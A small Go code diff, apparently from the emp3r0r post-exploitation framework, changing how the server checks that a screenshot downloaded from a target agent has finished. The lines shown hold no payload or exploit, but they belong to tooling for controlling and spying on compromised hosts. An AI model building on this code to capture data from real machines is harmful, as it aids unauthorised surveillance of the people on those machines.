@@ -51,8 +51,7 @@ func ProcessScreenshot(out string, target *def.Emp3r0rAgent) (err error) {
 
 	// be sure we have downloaded the file
 	is_download_completed := func() bool {
-		return !util.IsExist(live.FileGetDir+path+".downloading") &&
-			util.IsExist(live.FileGetDir+path)
+		return util.IsExist(live.FileGetDir + path)
 	}
 
 	is_download_corrupted := func() bool {
